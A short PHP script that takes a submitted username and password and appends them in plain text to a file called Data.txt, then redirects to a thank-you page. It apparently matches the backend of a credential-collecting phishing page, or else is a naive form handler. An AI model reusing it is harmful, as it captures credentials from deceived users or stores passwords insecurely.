<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the input data from the HTML form
    $txtField1 = $_POST['UsernameForm'];
    $txtField2 = $_POST['password'];

    $file = "Data.txt"; // Ensure the file path is correct relative to your PHP script

    // Open the file in append mode and write the new record
    try {
        $bufferedWriter = fopen($file, "a"); // Open file in append mode
        if ($bufferedWriter) {
            // Write the data with 5 spaces between the fields
            fwrite($bufferedWriter, $txtField1 . "     " . $txtField2 . PHP_EOL);
            fclose($bufferedWriter); // Close the file
        } else {
            throw new Exception("Unable to open file!");
        }
    } catch (Exception $e) {
        // Handle the error (for example, log it)
        error_log($e->getMessage());
    }

    // Redirect to the success page
    header("Location: thank_you.html");
    exit(); // Make sure to exit after redirection
}
?>